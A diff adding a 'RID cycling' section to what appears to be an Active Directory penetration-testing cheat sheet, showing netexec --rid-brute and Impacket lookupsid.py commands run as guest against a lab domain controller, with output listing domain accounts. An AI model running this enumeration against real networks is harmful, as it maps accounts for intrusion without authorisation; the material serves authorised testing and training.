@@ -303,6 +303,27 @@ You can remotely query every machines on the network to get a list of the users'
   ```
 
 
+## RID cycling
+
+Enumerate users from the Domain Controllers.
+
+* Using `netexec`
+  ```ps1
+  netexec smb 10.10.11.231 -u guest -p '' --rid-brute
+  SMB         10.10.11.231    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
+  SMB         10.10.11.231    445    DC01             [+] rebound.htb\guest: 
+  SMB         10.10.11.231    445    DC01             498: rebound\Enterprise Read-only Domain Controllers (SidTypeGroup)
+  SMB         10.10.11.231    445    DC01             500: rebound\Administrator (SidTypeUser)
+  SMB         10.10.11.231    445    DC01             501: rebound\Guest (SidTypeUser)
+  SMB         10.10.11.231    445    DC01             502: rebound\krbtgt (SidTypeUser)
+  ```
+
+* Using Impacket script [lookupsid.py](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py)
+  ```ps1
+  lookupsid.py -no-pass 'guest@rebound.htb' 20000
+  ```
+
+
 ## Other Interesting Commands
 
 - **Find Domain Controllers**
